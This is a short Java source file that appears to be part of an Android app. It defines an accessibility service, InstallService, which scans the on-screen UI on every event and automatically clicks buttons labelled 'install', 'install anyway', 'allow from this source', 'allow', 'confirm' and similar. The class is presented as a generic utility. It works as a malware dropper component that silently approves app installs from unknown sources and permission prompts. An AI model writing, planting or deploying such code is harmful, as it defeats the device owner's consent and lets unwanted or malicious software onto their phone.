package com.base.util.apps;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class InstallService extends AccessibilityService {

    private static final String[] CLICK_TEXTS = {
        "install", "next", "allow", "continue", "ok", "done",
        "install anyway", "allow from this source", "proceed", "confirm"
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        clickInstall(root);
        root.recycle();
    }

    private boolean clickInstall(AccessibilityNodeInfo node) {
        if (node == null) return false;
        CharSequence raw = node.getText();
        if (raw == null) raw = node.getContentDescription();
        String label = raw != null ? raw.toString().toLowerCase().trim() : "";
        for (String t : CLICK_TEXTS) {
            if (label.equals(t) && node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child == null) continue;
            boolean hit = clickInstall(child);
            child.recycle();
            if (hit) return true;
        }
        return false;
    }

    @Override
    public void onInterrupt() {}
}
